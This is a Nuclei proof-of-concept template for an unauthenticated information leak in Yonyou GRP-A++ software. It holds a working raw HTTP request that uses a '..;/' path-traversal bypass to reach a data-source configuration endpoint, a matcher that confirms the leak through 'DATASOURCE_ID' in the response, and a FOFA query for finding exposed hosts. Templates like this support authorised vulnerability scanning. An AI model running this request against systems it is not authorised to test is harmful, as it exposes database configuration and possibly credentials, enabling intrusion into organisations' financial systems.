# Add your nuclei formatted PoC!
id: yongyou-selectdatasourceinfo-infoleak
 
info:
  name: 用友GRP-A++-selectdatasourceinfo-未授权
  author: rain
  severity: high
  metadata:
    fofa-query: body="/pf/portal/login/css/fonts/style.css"
 
 
http:
  - raw:
      - |
        GET /pub/fe/config/..;/..;/..;/gla/dataSource/selectDatasourceInfo HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Accept-Language: en-US;q=0.9,en;q=0.8
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
        Connection: close
        Cache-Control: max-age=0
 
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"DATASOURCE_ID")
author: 蜜汁狗蛋
